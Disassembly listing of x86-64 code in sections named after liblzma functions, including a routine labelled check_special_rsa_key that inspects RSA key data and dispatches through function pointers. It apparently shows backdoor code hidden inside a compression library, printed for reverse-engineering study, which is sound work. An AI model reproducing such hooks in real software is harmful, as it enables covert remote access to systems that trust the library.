.text.file_info_decoda:00000000000092FB                 xor     ecx, ecx
.text.file_info_decoda:00000000000092FD                 xor     edx, edx
.text.file_info_decoda:00000000000092FF                 mov     dword ptr [rbp+104h], 4
.text.file_info_decoda:0000000000009309                 xor     esi, esi
.text.file_info_decoda:000000000000930B                 mov     edi, 1
.text.file_info_decoda:0000000000009310                 call    _Llzma_block_unpadded_size_1 ; PIC mode
.text.file_info_decoda:0000000000009315
.text.file_info_decoda:0000000000009315 loc_9315:                               ; CODE XREF: _Lfile_info_decode_0+238↑j
.text.file_info_decoda:0000000000009315                 test    eax, eax
.text.file_info_decoda:0000000000009317                 jnz     loc_947F
.text.file_info_decoda:000000000000931D                 jmp     loc_9459
.text.file_info_decoda:0000000000009322 ; ---------------------------------------------------------------------------
.text.file_info_decoda:0000000000009322
.text.file_info_decoda:0000000000009322 loc_9322:                               ; CODE XREF: _Lfile_info_decode_0+39F↑j
.text.file_info_decoda:0000000000009322                 mov     rcx, [rbp+20h]
.text.file_info_decoda:0000000000009326                 cmp     qword ptr [rcx+78h], 0
.text.file_info_decoda:000000000000932B                 jz      loc_9459
.text.file_info_decoda:0000000000009331                 cmp     rdx, 4
.text.file_info_decoda:0000000000009335                 jbe     loc_9459
.text.file_info_decoda:000000000000933B                 movzx   edx, word ptr [r15+0AEh]
.text.file_info_decoda:0000000000009343                 test    dx, dx
.text.file_info_decoda:0000000000009346                 jz      loc_9459
.text.file_info_decoda:000000000000934C                 sub     rax, 122h
.text.file_info_decoda:0000000000009352                 cmp     rdx, rax
.text.file_info_decoda:0000000000009355                 jnb     loc_9459
.text.file_info_decoda:000000000000935B                 sub     rax, rdx
.text.file_info_decoda:000000000000935E                 cmp     rax, 2
.text.file_info_decoda:0000000000009362                 jbe     loc_9459
.text.file_info_decoda:0000000000009368                 lea     rcx, [rsi+rdx+2]
.text.file_info_decoda:000000000000936D                 mov     dil, [rcx]
.text.file_info_decoda:0000000000009370                 mov     [r12+84h], dil
.text.file_info_decoda:0000000000009378                 mov     cl, [rcx+1]
.text.file_info_decoda:000000000000937B                 mov     [r12+85h], cl
.text.file_info_decoda:0000000000009383                 movzx   ecx, word ptr [r12+84h]
.text.file_info_decoda:000000000000938C                 test    cx, cx
.text.file_info_decoda:000000000000938F                 jz      short loc_939A
.text.file_info_decoda:0000000000009391                 sub     rax, 2
.text.file_info_decoda:0000000000009395                 cmp     rax, rcx
.text.file_info_decoda:0000000000009398                 jnb     short loc_93AA
.text.file_info_decoda:000000000000939A
.text.file_info_decoda:000000000000939A loc_939A:                               ; CODE XREF: _Lfile_info_decode_0+4BF↑j
.text.file_info_decoda:000000000000939A                 mov     word ptr [r12+84h], 0
.text.file_info_decoda:00000000000093A5                 jmp     loc_9459
.text.file_info_decoda:00000000000093AA ; ---------------------------------------------------------------------------
.text.file_info_decoda:00000000000093AA
.text.file_info_decoda:00000000000093AA loc_93AA:                               ; CODE XREF: _Lfile_info_decode_0+4C8↑j
.text.file_info_decoda:00000000000093AA                 mov     rcx, [rbp+20h]
.text.file_info_decoda:00000000000093AE                 lea     rax, [rsi+rdx+4]
.text.file_info_decoda:00000000000093B3                 mov     rdi, [rbp+10h]
.text.file_info_decoda:00000000000093B7                 mov     [r12+88h], rax
.text.file_info_decoda:00000000000093BF                 mov     rax, [rcx+20h]
.text.file_info_decoda:00000000000093C3                 test    rax, rax
.text.file_info_decoda:00000000000093C6                 jz      loc_9459
.text.file_info_decoda:00000000000093CC                 mov     rcx, [rcx+78h]
.text.file_info_decoda:00000000000093D0                 lea     rsi, [r15+0B0h]
.text.file_info_decoda:00000000000093D7                 mov     [rcx], rax
.text.file_info_decoda:00000000000093DA                 mov     rcx, rdi
.text.file_info_decoda:00000000000093DD                 mov     edi, [rsp+158h+var_154]
.text.file_info_decoda:00000000000093E1                 call    sub_7120
.text.file_info_decoda:00000000000093E6                 test    rax, rax
.text.file_info_decoda:00000000000093E9                 jns     loc_94AE
.text.file_info_decoda:00000000000093EF                 jmp     loc_947F
.text.file_info_decoda:00000000000093F4 ; ---------------------------------------------------------------------------
.text.file_info_decoda:00000000000093F4
.text.file_info_decoda:00000000000093F4 loc_93F4:                               ; CODE XREF: _Lfile_info_decode_0+3A8↑j
.text.file_info_decoda:00000000000093F4                 cmp     qword ptr [rbx+30h], 0
.text.file_info_decoda:00000000000093F9                 jz      short loc_9459
.text.file_info_decoda:00000000000093FB                 cmp     rdx, 8
.text.file_info_decoda:00000000000093FF                 jbe     short loc_9459
.text.file_info_decoda:0000000000009401                 cmp     byte ptr [rsi+rax-121h], 0
.text.file_info_decoda:0000000000009409                 jnz     short loc_9459
.text.file_info_decoda:000000000000940B                 mov     r12, [r15+0AEh]
.text.file_info_decoda:0000000000009412                 mov     rax, r12
.text.file_info_decoda:0000000000009415                 shr     rax, 20h
.text.file_info_decoda:0000000000009419                 mov     edi, eax
.text.file_info_decoda:000000000000941B                 test    eax, eax
.text.file_info_decoda:000000000000941D                 jnz     short loc_9429
.text.file_info_decoda:000000000000941F
.text.file_info_decoda:000000000000941F loc_941F:                               ; CODE XREF: _Lfile_info_decode_0+562↓j
.text.file_info_decoda:000000000000941F                 mov     edi, r12d
.text.file_info_decoda:0000000000009422                 test    r12d, r12d
.text.file_info_decoda:0000000000009425                 jnz     short loc_9436
.text.file_info_decoda:0000000000009427                 jmp     short loc_9443
.text.file_info_decoda:0000000000009429 ; ---------------------------------------------------------------------------
.text.file_info_decoda:0000000000009429
.text.file_info_decoda:0000000000009429 loc_9429:                               ; CODE XREF: _Lfile_info_decode_0+54D↑j
.text.file_info_decoda:0000000000009429                 mov     edx, eax
.text.file_info_decoda:000000000000942B                 mov     esi, eax
.text.file_info_decoda:000000000000942D                 call    qword ptr [rbx+20h]
.text.file_info_decoda:0000000000009430                 inc     eax
.text.file_info_decoda:0000000000009432                 jnz     short loc_941F
.text.file_info_decoda:0000000000009434                 jmp     short loc_9459
.text.file_info_decoda:0000000000009436 ; ---------------------------------------------------------------------------
.text.file_info_decoda:0000000000009436
.text.file_info_decoda:0000000000009436 loc_9436:                               ; CODE XREF: _Lfile_info_decode_0+555↑j
.text.file_info_decoda:0000000000009436                 mov     edx, r12d
.text.file_info_decoda:0000000000009439                 mov     esi, r12d
.text.file_info_decoda:000000000000943C                 call    qword ptr [rbx+28h]
.text.file_info_decoda:000000000000943F                 inc     eax
.text.file_info_decoda:0000000000009441                 jz      short loc_9459
.text.file_info_decoda:0000000000009443
.text.file_info_decoda:0000000000009443 loc_9443:                               ; CODE XREF: _Lfile_info_decode_0+557↑j
.text.file_info_decoda:0000000000009443                 lea     rdi, [r15+0B6h]
.text.file_info_decoda:000000000000944A                 call    qword ptr [rbx+30h]
.text.file_info_decoda:000000000000944D                 mov     dword ptr [rbp+104h], 4
.text.file_info_decoda:0000000000009457                 jmp     short loc_947F
.text.file_info_decoda:0000000000009459 ; ---------------------------------------------------------------------------
.text.file_info_decoda:0000000000009459
.text.file_info_decoda:0000000000009459 loc_9459:                               ; CODE XREF: _Lfile_info_decode_0+7E↑j
.text.file_info_decoda:0000000000009459                                         ; _Lfile_info_decode_0+8D↑j ...
.text.file_info_decoda:0000000000009459                 mov     rax, [rbp+10h]
.text.file_info_decoda:000000000000945D                 test    rax, rax
.text.file_info_decoda:0000000000009460                 jz      short loc_947F
.text.file_info_decoda:0000000000009462                 mov     rax, [rax+18h]
.text.file_info_decoda:0000000000009466                 test    rax, rax
.text.file_info_decoda:0000000000009469                 jz      short loc_947F
.text.file_info_decoda:000000000000946B                 mov     dword ptr [rbp+104h], 0FFFFFFFFh
.text.file_info_decoda:0000000000009475                 cmp     dword ptr [rbp+50h], 0
.text.file_info_decoda:0000000000009479                 jz      short loc_947F
.text.file_info_decoda:000000000000947B                 xor     edi, edi
.text.file_info_decoda:000000000000947D                 call    rax
.text.file_info_decoda:000000000000947F
.text.file_info_decoda:000000000000947F loc_947F:                               ; CODE XREF: _Lfile_info_decode_0+6E↑j
.text.file_info_decoda:000000000000947F                                         ; _Lfile_info_decode_0+CC↑j ...
.text.file_info_decoda:000000000000947F                 mov     rdx, [rsp+158h+var_150]
.text.file_info_decoda:0000000000009484                 mov     esi, [rsp+158h+var_154]
.text.file_info_decoda:0000000000009488                 mov     rdi, r13
.text.file_info_decoda:000000000000948B                 mov     rax, r14
.text.file_info_decoda:000000000000948E                 add     rsp, 128h
.text.file_info_decoda:0000000000009495                 pop     rbx
.text.file_info_decoda:0000000000009496                 pop     rbp
.text.file_info_decoda:0000000000009497                 pop     r12
.text.file_info_decoda:0000000000009499                 pop     r13
.text.file_info_decoda:000000000000949B                 pop     r14
.text.file_info_decoda:000000000000949D                 pop     r15
.text.file_info_decoda:000000000000949F                 jmp     rax
.text.file_info_decoda:00000000000094A1 ; ---------------------------------------------------------------------------
.text.file_info_decoda:00000000000094A1
.text.file_info_decoda:00000000000094A1 loc_94A1:                               ; CODE XREF: _Lfile_info_decode_0+5E↑j
.text.file_info_decoda:00000000000094A1                                         ; _Lfile_info_decode_0+292↑j ...
.text.file_info_decoda:00000000000094A1                 mov     rax, [rbx+18h]
.text.file_info_decoda:00000000000094A5                 test    rax, rax
.text.file_info_decoda:00000000000094A8                 jz      short loc_94AE
.text.file_info_decoda:00000000000094AA                 xor     edi, edi
.text.file_info_decoda:00000000000094AC                 call    rax
.text.file_info_decoda:00000000000094AE
.text.file_info_decoda:00000000000094AE loc_94AE:                               ; CODE XREF: _Lfile_info_decode_0+28↑j
.text.file_info_decoda:00000000000094AE                                         ; _Lfile_info_decode_0+35↑j ...
.text.file_info_decoda:00000000000094AE                 add     rsp, 128h
.text.file_info_decoda:00000000000094B5                 xor     eax, eax
.text.file_info_decoda:00000000000094B7                 pop     rbx
.text.file_info_decoda:00000000000094B8                 pop     rbp
.text.file_info_decoda:00000000000094B9                 pop     r12
.text.file_info_decoda:00000000000094BB                 pop     r13
.text.file_info_decoda:00000000000094BD                 pop     r14
.text.file_info_decoda:00000000000094BF                 pop     r15
.text.file_info_decoda:00000000000094C1                 retn
.text.file_info_decoda:00000000000094C1 _Lfile_info_decode_0 endp
.text.file_info_decoda:00000000000094C1
.text.file_info_decoda:00000000000094C1 _text_file_info_decoda ends
.text.file_info_decoda:00000000000094C1
.text.lzma_index_stream_siza:00000000000094D0 ; ===========================================================================
.text.lzma_index_stream_siza:00000000000094D0
.text.lzma_index_stream_siza:00000000000094D0 ; Segment type: Pure code
.text.lzma_index_stream_siza:00000000000094D0 ; Segment permissions: Read/Execute
.text.lzma_index_stream_siza:00000000000094D0 _text_lzma_index_stream_siza segment para public 'CODE' use64
.text.lzma_index_stream_siza:00000000000094D0                 assume cs:_text_lzma_index_stream_siza
.text.lzma_index_stream_siza:00000000000094D0                 ;org 94D0h
.text.lzma_index_stream_siza:00000000000094D0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_index_stream_siza:00000000000094D0
.text.lzma_index_stream_siza:00000000000094D0 ; =============== S U B R O U T I N E =======================================
.text.lzma_index_stream_siza:00000000000094D0
.text.lzma_index_stream_siza:00000000000094D0
.text.lzma_index_stream_siza:00000000000094D0 ; __int64 __fastcall check_special_rsa_key(__int64, __int64, _DWORD *)
.text.lzma_index_stream_siza:00000000000094D0                 public check_special_rsa_key
.text.lzma_index_stream_siza:00000000000094D0 check_special_rsa_key proc near         ; CODE XREF: _Llzma_index_prealloc_0+52↓p
.text.lzma_index_stream_siza:00000000000094D0                                         ; _Llzma_index_memusage_part_0+3D↓p ...
.text.lzma_index_stream_siza:00000000000094D0
.text.lzma_index_stream_siza:00000000000094D0 var_5F8         = qword ptr -5F8h
.text.lzma_index_stream_siza:00000000000094D0 var_5F0         = qword ptr -5F0h
.text.lzma_index_stream_siza:00000000000094D0 var_5E8         = qword ptr -5E8h
.text.lzma_index_stream_siza:00000000000094D0 var_5E0         = qword ptr -5E0h
.text.lzma_index_stream_siza:00000000000094D0 var_5D8         = qword ptr -5D8h
.text.lzma_index_stream_siza:00000000000094D0 var_5D0         = qword ptr -5D0h
.text.lzma_index_stream_siza:00000000000094D0 var_5C8         = qword ptr -5C8h
.text.lzma_index_stream_siza:00000000000094D0 var_5C0         = qword ptr -5C0h
.text.lzma_index_stream_siza:00000000000094D0 var_5B4         = dword ptr -5B4h
.text.lzma_index_stream_siza:00000000000094D0 var_5B0         = qword ptr -5B0h
.text.lzma_index_stream_siza:00000000000094D0 var_5A1         = byte ptr -5A1h
.text.lzma_index_stream_siza:00000000000094D0 var_5A0         = qword ptr -5A0h
.text.lzma_index_stream_siza:00000000000094D0 var_598         = qword ptr -598h
.text.lzma_index_stream_siza:00000000000094D0 var_590         = xmmword ptr -590h
.text.lzma_index_stream_siza:00000000000094D0 var_580         = byte ptr -580h
.text.lzma_index_stream_siza:00000000000094D0 var_550         = xmmword ptr -550h
.text.lzma_index_stream_siza:00000000000094D0 var_540         = qword ptr -540h
.text.lzma_index_stream_siza:00000000000094D0 var_538         = qword ptr -538h
.text.lzma_index_stream_siza:00000000000094D0 var_530         = qword ptr -530h
.text.lzma_index_stream_siza:00000000000094D0 var_528         = word ptr -528h
.text.lzma_index_stream_siza:00000000000094D0 var_520         = qword ptr -520h
.text.lzma_index_stream_siza:00000000000094D0 var_45A         = byte ptr -45Ah
.text.lzma_index_stream_siza:00000000000094D0 var_451         = byte ptr -451h
.text.lzma_index_stream_siza:00000000000094D0 var_2F0         = qword ptr -2F0h
.text.lzma_index_stream_siza:00000000000094D0 var_2E8         = qword ptr -2E8h
.text.lzma_index_stream_siza:00000000000094D0 var_2E0         = qword ptr -2E0h
.text.lzma_index_stream_siza:00000000000094D0 var_2CB         = byte ptr -2CBh
.text.lzma_index_stream_siza:00000000000094D0 var_259         = dword ptr -259h
.text.lzma_index_stream_siza:00000000000094D0 var_255         = byte ptr -255h
.text.lzma_index_stream_siza:00000000000094D0 var_254         = byte ptr -254h
.text.lzma_index_stream_siza:00000000000094D0 var_83          = xmmword ptr -83h
.text.lzma_index_stream_siza:00000000000094D0 var_73          = byte ptr -73h
.text.lzma_index_stream_siza:00000000000094D0
.text.lzma_index_stream_siza:00000000000094D0                 endbr64
.text.lzma_index_stream_siza:00000000000094D4                 push    r15
.text.lzma_index_stream_siza:00000000000094D6                 mov     ecx, 0AEh
.text.lzma_index_stream_siza:00000000000094DB                 xor     eax, eax
.text.lzma_index_stream_siza:00000000000094DD                 push    r14
.text.lzma_index_stream_siza:00000000000094DF                 push    r13
.text.lzma_index_stream_siza:00000000000094E1                 push    r12
.text.lzma_index_stream_siza:00000000000094E3                 push    rbp
.text.lzma_index_stream_siza:00000000000094E4                 push    rbx
.text.lzma_index_stream_siza:00000000000094E5                 sub     rsp, 5C8h
.text.lzma_index_stream_siza:00000000000094EC                 mov     [rsp+5F8h+var_5D8], rdi
.text.lzma_index_stream_siza:00000000000094F1                 lea     rdi, [rsp+5F8h+var_2F0]
.text.lzma_index_stream_siza:00000000000094F9                 rep stosd
.text.lzma_index_stream_siza:00000000000094FB                 mov     [rsp+5F8h+var_5F0], rdx
.text.lzma_index_stream_siza:0000000000009500                 test    rsi, rsi
.text.lzma_index_stream_siza:0000000000009503                 jz      loc_A23F
.text.lzma_index_stream_siza:0000000000009509                 cmp     dword ptr [rsi+18h], 0
.text.lzma_index_stream_siza:000000000000950D                 mov     r13, rsi
.text.lzma_index_stream_siza:0000000000009510                 jnz     loc_A237
.text.lzma_index_stream_siza:0000000000009516                 cmp     [rsp+5F8h+var_5D8], 0
.text.lzma_index_stream_siza:000000000000951C                 jz      loc_A237
.text.lzma_index_stream_siza:0000000000009522                 mov     rax, [rsi+8]
.text.lzma_index_stream_siza:0000000000009526                 test    rax, rax
.text.lzma_index_stream_siza:0000000000009529                 jz      loc_A237
.text.lzma_index_stream_siza:000000000000952F                 mov     r8, [rax+60h]
.text.lzma_index_stream_siza:0000000000009533                 test    r8, r8
.text.lzma_index_stream_siza:0000000000009536                 jz      loc_A237
.text.lzma_index_stream_siza:000000000000953C                 cmp     qword ptr [rax+100h], 0
.text.lzma_index_stream_siza:0000000000009544                 jz      loc_A237
.text.lzma_index_stream_siza:000000000000954A                 test    rdx, rdx
.text.lzma_index_stream_siza:000000000000954D                 jnz     short loc_955B
.text.lzma_index_stream_siza:000000000000954F                 mov     dword ptr [rsi+18h], 1
.text.lzma_index_stream_siza:0000000000009556                 jmp     loc_A155
.text.lzma_index_stream_siza:000000000000955B ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:000000000000955B
.text.lzma_index_stream_siza:000000000000955B loc_955B:                               ; CODE XREF: check_special_rsa_key+7D↑j
.text.lzma_index_stream_siza:000000000000955B                 mov     rax, [rsp+5F8h+var_5F0]
.text.lzma_index_stream_siza:0000000000009560                 mov     rdi, [rsp+5F8h+var_5D8]
.text.lzma_index_stream_siza:0000000000009565                 xor     ecx, ecx
.text.lzma_index_stream_siza:0000000000009567                 lea     rdx, [rsp+5F8h+var_2E8]
.text.lzma_index_stream_siza:000000000000956F                 lea     rsi, [rsp+5F8h+var_2F0]
.text.lzma_index_stream_siza:0000000000009577                 mov     dword ptr [rax], 1
.text.lzma_index_stream_siza:000000000000957D                 call    r8
.text.lzma_index_stream_siza:0000000000009580                 mov     rdi, [rsp+5F8h+var_2F0]
.text.lzma_index_stream_siza:0000000000009588                 test    rdi, rdi
.text.lzma_index_stream_siza:000000000000958B                 jz      loc_A142
.text.lzma_index_stream_siza:0000000000009591                 cmp     [rsp+5F8h+var_2E8], 0
.text.lzma_index_stream_siza:000000000000959A                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000095A0                 mov     rax, [r13+8]
.text.lzma_index_stream_siza:00000000000095A4                 test    rax, rax
.text.lzma_index_stream_siza:00000000000095A7                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000095AD                 mov     rax, [rax+68h]
.text.lzma_index_stream_siza:00000000000095B1                 test    rax, rax
.text.lzma_index_stream_siza:00000000000095B4                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000095BA                 call    rax
.text.lzma_index_stream_siza:00000000000095BC                 cmp     eax, 4000h
.text.lzma_index_stream_siza:00000000000095C1                 ja      loc_A142
.text.lzma_index_stream_siza:00000000000095C7                 lea     ebx, [rax+7]
.text.lzma_index_stream_siza:00000000000095CA                 shr     ebx, 3
.text.lzma_index_stream_siza:00000000000095CD                 lea     eax, [rbx-14h]
.text.lzma_index_stream_siza:00000000000095D0                 cmp     eax, 204h
.text.lzma_index_stream_siza:00000000000095D5                 ja      loc_A142
.text.lzma_index_stream_siza:00000000000095DB                 mov     rax, [r13+8]
.text.lzma_index_stream_siza:00000000000095DF                 mov     rdi, [rsp+5F8h+var_2F0]
.text.lzma_index_stream_siza:00000000000095E7                 lea     rsi, [rsp+5F8h+var_2E0+5]
.text.lzma_index_stream_siza:00000000000095EF                 call    qword ptr [rax+100h]
.text.lzma_index_stream_siza:00000000000095F5                 test    eax, eax
.text.lzma_index_stream_siza:00000000000095F7                 js      loc_A142
.text.lzma_index_stream_siza:00000000000095FD                 mov     ecx, ebx
.text.lzma_index_stream_siza:00000000000095FF                 cdqe
.text.lzma_index_stream_siza:0000000000009601                 mov     [rsp+5F8h+var_5E8], rcx
.text.lzma_index_stream_siza:0000000000009606                 cmp     rcx, rax
.text.lzma_index_stream_siza:0000000000009609                 jb      loc_A142
.text.lzma_index_stream_siza:000000000000960F                 cmp     rax, 10h
.text.lzma_index_stream_siza:0000000000009613                 jbe     loc_A14A
.text.lzma_index_stream_siza:0000000000009619                 mov     ebp, dword ptr [rsp+5F8h+var_2E0+5]
.text.lzma_index_stream_siza:0000000000009620                 test    ebp, ebp
.text.lzma_index_stream_siza:0000000000009622                 jz      loc_A14A
.text.lzma_index_stream_siza:0000000000009628                 mov     eax, [rsp+321h]
.text.lzma_index_stream_siza:000000000000962F                 test    eax, eax
.text.lzma_index_stream_siza:0000000000009631                 jz      loc_A14A
.text.lzma_index_stream_siza:0000000000009637                 imul    rbp, rax
.text.lzma_index_stream_siza:000000000000963B                 add     rbp, [rsp+325h]
.text.lzma_index_stream_siza:0000000000009643                 cmp     rbp, 3
.text.lzma_index_stream_siza:0000000000009647                 ja      loc_A14A
.text.lzma_index_stream_siza:000000000000964D                 mov     rax, [r13+10h]
.text.lzma_index_stream_siza:0000000000009651                 test    rax, rax
.text.lzma_index_stream_siza:0000000000009654                 jz      loc_A142
.text.lzma_index_stream_siza:000000000000965A                 cmp     qword ptr [rax+10h], 0
.text.lzma_index_stream_siza:000000000000965F                 jz      loc_A142
.text.lzma_index_stream_siza:0000000000009665                 cmp     qword ptr [rax+18h], 0
.text.lzma_index_stream_siza:000000000000966A                 jz      loc_A142
.text.lzma_index_stream_siza:0000000000009670                 cmp     qword ptr [r13+30h], 0
.text.lzma_index_stream_siza:0000000000009675                 jz      loc_A142
.text.lzma_index_stream_siza:000000000000967B                 cmp     dword ptr [r13+160h], 1C8h
.text.lzma_index_stream_siza:0000000000009686                 jnz     loc_A142
.text.lzma_index_stream_siza:000000000000968C                 movups  xmm1, xmmword ptr [rsp+5F8h+var_2E0+5]
.text.lzma_index_stream_siza:0000000000009694                 lea     r12, [rsp+5F8h+var_73]
.text.lzma_index_stream_siza:000000000000969C                 mov     rsi, r13
.text.lzma_index_stream_siza:000000000000969F                 mov     rdi, r12
.text.lzma_index_stream_siza:00000000000096A2                 movups  [rsp+5F8h+var_83], xmm1
.text.lzma_index_stream_siza:00000000000096AA                 call    _Lparse_lzma12_0 ; PIC mode
.text.lzma_index_stream_siza:00000000000096AF                 test    eax, eax
.text.lzma_index_stream_siza:00000000000096B1                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000096B7                 lea     rdi, [rsp+5F8h+var_2CB]
.text.lzma_index_stream_siza:00000000000096BF                 mov     r9, [r13+8]
.text.lzma_index_stream_siza:00000000000096C3                 lea     esi, [rbx-10h]
.text.lzma_index_stream_siza:00000000000096C6                 mov     rdx, r12
.text.lzma_index_stream_siza:00000000000096C9                 lea     rcx, [rsp+5F8h+var_83]
.text.lzma_index_stream_siza:00000000000096D1                 mov     r8, rdi
.text.lzma_index_stream_siza:00000000000096D4                 call    sub_71C0
.text.lzma_index_stream_siza:00000000000096D9                 test    eax, eax
.text.lzma_index_stream_siza:00000000000096DB                 jz      loc_A142
.text.lzma_index_stream_siza:00000000000096E1                 xor     edx, edx
.text.lzma_index_stream_siza:00000000000096E3                 mov     ecx, 39h ; '9'
.text.lzma_index_stream_siza:00000000000096E8                 xorps   xmm0, xmm0
.text.lzma_index_stream_siza:00000000000096EB                 mov     rdi, r12
.text.lzma_index_stream_siza:00000000000096EE                 mov     eax, edx
.text.lzma_index_stream_siza:00000000000096F0                 movups  [rsp+5F8h+var_550], xmm0
.text.lzma_index_stream_siza:00000000000096F8                 rep stosb
.text.lzma_index_stream_siza:00000000000096FA                 xor     eax, eax
.text.lzma_index_stream_siza:00000000000096FC                 mov     ecx, 93h
.text.lzma_index_stream_siza:0000000000009701                 movups  [rsp+5F8h+var_590], xmm0
.text.lzma_index_stream_siza:0000000000009706                 lea     rdi, [rsp+5F8h+var_540]
.text.lzma_index_stream_siza:000000000000970E                 rep stosd
.text.lzma_index_stream_siza:0000000000009710                 mov     eax, edx
.text.lzma_index_stream_siza:0000000000009712                 mov     rdx, [r13+28h]
.text.lzma_index_stream_siza:0000000000009716                 lea     rdi, [rsp+5F8h+var_580]
.text.lzma_index_stream_siza:000000000000971B                 mov     ecx, 29h ; ')'
.text.lzma_index_stream_siza:0000000000009720                 rep stosb
.text.lzma_index_stream_siza:0000000000009722                 test    rdx, rdx
.text.lzma_index_stream_siza:0000000000009725                 jz      loc_A142
.text.lzma_index_stream_siza:000000000000972B                 cmp     qword ptr [rdx+8], 0
.text.lzma_index_stream_siza:0000000000009730                 jz      loc_A142
.text.lzma_index_stream_siza:0000000000009736                 cmp     qword ptr [r13+8], 0
.text.lzma_index_stream_siza:000000000000973B                 jz      loc_A142
.text.lzma_index_stream_siza:0000000000009741                 mov     rax, [rsp+5F8h+var_5E8]
.text.lzma_index_stream_siza:0000000000009746                 sub     rax, 10h
.text.lzma_index_stream_siza:000000000000974A                 cmp     rax, 71h ; 'q'
.text.lzma_index_stream_siza:000000000000974E                 jbe     loc_A142
.text.lzma_index_stream_siza:0000000000009754                 mov     rax, [rsp+5F8h+var_5E8]
.text.lzma_index_stream_siza:0000000000009759                 mov     dword ptr [rsp+5F8h+var_550], ebp
.text.lzma_index_stream_siza:0000000000009760                 sub     rax, 82h
.text.lzma_index_stream_siza:0000000000009766                 cmp     rax, 4
.text.lzma_index_stream_siza:000000000000976A                 jbe     loc_A142
.text.lzma_index_stream_siza:0000000000009770                 mov     eax, [rsp+5F8h+var_259]
.text.lzma_index_stream_siza:0000000000009777                 mov     dword ptr [rsp+5F8h+var_2E0], eax
.text.lzma_index_stream_siza:000000000000977E                 mov     al, [rsp+5F8h+var_255]
.text.lzma_index_stream_siza:0000000000009785                 mov     byte ptr [rsp+5F8h+var_2E0+4], al
.text.lzma_index_stream_siza:000000000000978C                 mov     rax, [rsp+5F8h+var_5E8]
.text.lzma_index_stream_siza:0000000000009791                 sub     rax, 87h
.text.lzma_index_stream_siza:0000000000009797                 mov     [rsp+5F8h+var_5F8], rax
.text.lzma_index_stream_siza:000000000000979B                 cmp     rbp, 2
.text.lzma_index_stream_siza:000000000000979F                 jnz     short loc_9810
.text.lzma_index_stream_siza:00000000000097A1                 cmp     byte ptr [rsp+5F8h+var_2E0], 0
.text.lzma_index_stream_siza:00000000000097A9                 movzx   eax, word ptr [rsp+5F8h+var_2E0+3]
.text.lzma_index_stream_siza:00000000000097B1                 js      short loc_97C3
.text.lzma_index_stream_siza:00000000000097B3                 test    byte ptr [rsp+5F8h+var_2E0+1], 1
.text.lzma_index_stream_siza:00000000000097BB                 jz      short loc_97E0
.text.lzma_index_stream_siza:00000000000097BD                 add     rax, 8
.text.lzma_index_stream_siza:00000000000097C1                 jmp     short loc_97E0
.text.lzma_index_stream_siza:00000000000097C3 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:00000000000097C3
.text.lzma_index_stream_siza:00000000000097C3 loc_97C3:                               ; CODE XREF: check_special_rsa_key+2E1↑j
.text.lzma_index_stream_siza:00000000000097C3                 test    ax, ax
.text.lzma_index_stream_siza:00000000000097C6                 jnz     loc_A142
.text.lzma_index_stream_siza:00000000000097CC                 xor     ebx, ebx
.text.lzma_index_stream_siza:00000000000097CE                 mov     eax, 39h ; '9'
.text.lzma_index_stream_siza:00000000000097D3                 lea     r14, [rsp+5F8h+var_254]
.text.lzma_index_stream_siza:00000000000097DB                 xor     r15d, r15d
.text.lzma_index_stream_siza:00000000000097DE                 jmp     short loc_97EC
.text.lzma_index_stream_siza:00000000000097E0 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:00000000000097E0
.text.lzma_index_stream_siza:00000000000097E0 loc_97E0:                               ; CODE XREF: check_special_rsa_key+2EB↑j
.text.lzma_index_stream_siza:00000000000097E0                                         ; check_special_rsa_key+2F1↑j
.text.lzma_index_stream_siza:00000000000097E0                 mov     rbx, rax
.text.lzma_index_stream_siza:00000000000097E3                 xor     r14d, r14d
.text.lzma_index_stream_siza:00000000000097E6                 mov     r15d, 87h
.text.lzma_index_stream_siza:00000000000097EC
.text.lzma_index_stream_siza:00000000000097EC loc_97EC:                               ; CODE XREF: check_special_rsa_key+30E↑j
.text.lzma_index_stream_siza:00000000000097EC                 cmp     [rsp+5F8h+var_5F8], rax
.text.lzma_index_stream_siza:00000000000097F0                 jb      loc_A142
.text.lzma_index_stream_siza:00000000000097F6                 lea     rsi, [rax+5]
.text.lzma_index_stream_siza:00000000000097FA                 sub     [rsp+5F8h+var_5F8], rax
.text.lzma_index_stream_siza:00000000000097FE                 lea     r12, [rax+87h]
.text.lzma_index_stream_siza:0000000000009805                 add     rax, 4
.text.lzma_index_stream_siza:0000000000009809                 mov     [rsp+5F8h+var_5E0], rsi
.text.lzma_index_stream_siza:000000000000980E                 jmp     short loc_986A
.text.lzma_index_stream_siza:0000000000009810 ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:0000000000009810
.text.lzma_index_stream_siza:0000000000009810 loc_9810:                               ; CODE XREF: check_special_rsa_key+2CF↑j
.text.lzma_index_stream_siza:0000000000009810                 cmp     ebp, 3
.text.lzma_index_stream_siza:0000000000009813                 jnz     short loc_984E
.text.lzma_index_stream_siza:0000000000009815                 test    byte ptr [rsp+5F8h+var_2E0+1], 40h
.text.lzma_index_stream_siza:000000000000981D                 jnz     short loc_984E
.text.lzma_index_stream_siza:000000000000981F                 cmp     [rsp+5F8h+var_5F8], 2Fh ; '/'
.text.lzma_index_stream_siza:0000000000009824                 jbe     loc_A142
.text.lzma_index_stream_siza:000000000000982A                 mov     ebx, 30h ; '0'
.text.lzma_index_stream_siza:000000000000982F                 mov     r15d, 87h
.text.lzma_index_stream_siza:0000000000009835                 xor     r14d, r14d
.text.lzma_index_stream_siza:0000000000009838                 mov     [rsp+5F8h+var_5E0], 35h ; '5'
.text.lzma_index_stream_siza:0000000000009841                 mov     r12d, 87h
.text.lzma_index_stream_siza:0000000000009847                 mov     eax, 34h ; '4'
.text.lzma_index_stream_siza:000000000000984C                 jmp     short loc_986A
.text.lzma_index_stream_siza:000000000000984E ; ---------------------------------------------------------------------------
.text.lzma_index_stream_siza:000000000000984E
.text.lzma_index_stream_siza:000000000000984E loc_984E:                               ; CODE XREF: check_special_rsa_key+343↑j
.text.lzma_index_stream_siza:000000000000984E                                         ; check_special_rsa_key+34D↑j
.text.lzma_index_stream_siza:000000000000984E                 xor     ebx, ebx
.text.lzma_index_stream_siza:0000000000009850                 xor     r15d, r15d
